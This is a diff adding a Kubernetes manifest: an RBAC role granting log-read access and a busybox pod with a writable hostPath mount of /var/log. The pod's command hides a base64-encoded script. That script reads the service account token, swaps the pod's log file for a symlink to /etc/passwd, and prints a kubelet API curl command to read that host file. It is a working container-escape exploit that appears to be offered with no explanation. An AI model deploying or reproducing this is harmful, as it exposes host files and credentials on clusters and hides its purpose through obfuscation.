@@ -1,0 +1,49 @@
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRole
+metadata:
+  name: user-log-reader
+rules:
+  - apiGroups: [""]
+    resources:
+      - nodes/log
+    verbs: ["get", "list", "watch"]
+  - apiGroups: [ "" ]
+    resources:
+      - pods/log
+    verbs: [ "get", "list", "watch" ]
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRoleBinding
+metadata:
+  name: user-log-reader
+roleRef:
+  apiGroup: rbac.authorization.k8s.io
+  kind: ClusterRole
+  name: user-log-reader
+subjects:
+  - kind: ServiceAccount
+    name: default
+    namespace: default
+---
+apiVersion: v1
+kind: Pod
+metadata:
+  name: busybox
+spec:
+  tolerations:
+    - key: "node-role.kubernetes.io/master"
+      operator: "Exists"
+  volumes:
+    - name: var-log
+      hostPath:
+        path: /var/log
+        type: DirectoryOrCreate
+  containers:
+    - name: busybox
+      image: busybox:latest
+      command: [sh, -c, "echo ZWNobyAiJ3J1bi5zaCcgc3RhcnQiCgpzbGVlcCAyMAoKbG9nX3BhdGg9JChmaW5kIC92YXIvbG9nL3BvZHMgLW5hbWUgIjAubG9nInxncmVwIGJ1c3lib3gpCgojd2dldCBpcGluZm8uaW8KI2V4dGVybmFsX2lwPSQoY2F0IGluZGV4Lmh0bWwgfGdyZXAgJyJpcCInfGF3ayAtRiciJyAne3ByaW50ICQ0fScpCgp0b2tlbj0kKGNhdCAvdmFyL3J1bi9zZWNyZXRzL2t1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvdG9rZW4pCnRtcF9wYXRoPSQoZWNobyAkbG9nX3BhdGh8c2VkICdzL1wvdmFyXC9sb2cvL2cnKQoKZWNobyAtZSAiKioqIHlvdSBjYW4gcnVuIGJlbG93IGNvbW1hbmQgdG8gcmVhZCAnL2V0Yy9wYXNzd2QnIHZpYSBrdWJlbGV0IGFwaSAqKiogXG4iCmVjaG8gLWUgImN1cmwgaHR0cHM6Ly8kZXh0ZXJuYWxfaXA6MTAyNTAvbG9ncyR0bXBfcGF0aCAtSCBcIkF1dGhvcml6YXRpb246QmVhcmVyICR0b2tlblwiIC1rIFxuIgoKc2xlZXAgNjAKCnJtIC1mICRsb2dfcGF0aCAmJiBlY2hvICJybSBzdWNjZXNzIiAmJiBzbGVlcCAxMApsbiAtc3YgL2V0Yy9wYXNzd2QgJGxvZ19wYXRoCgp0YWlsIC1mIC9kZXYvbnVsbAo=|base64 -d|sh"]
+      imagePullPolicy: IfNotPresent
+      volumeMounts:
+        - name: var-log
+          readOnly: false
+          mountPath: /var/log
